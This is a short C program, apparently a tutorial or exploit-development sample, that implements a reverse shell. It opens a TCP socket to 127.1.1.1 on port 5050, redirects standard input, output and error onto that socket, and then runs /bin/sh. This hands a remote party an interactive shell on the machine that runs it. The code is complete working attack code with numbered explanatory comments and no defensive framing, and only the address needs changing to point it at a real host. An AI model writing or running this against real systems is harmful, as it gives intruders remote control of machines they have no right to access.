#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main()
{
    // 1. Create socket
    int connect_socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    // 2. Connect socket to remote port and address
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5050);
    addr.sin_addr.s_addr = inet_addr("127.1.1.1");
    connect(connect_socket_fd, (struct sockaddr *)&addr, sizeof(addr));

    // 3. Duplicate stdin, stdout and stderr file descriptors
    dup2(connect_socket_fd, STDIN_FILENO);
    dup2(connect_socket_fd, STDOUT_FILENO);
    dup2(connect_socket_fd, STDERR_FILENO);

    // 4. Spawn shell
    execve("/bin/sh", NULL, NULL);
}
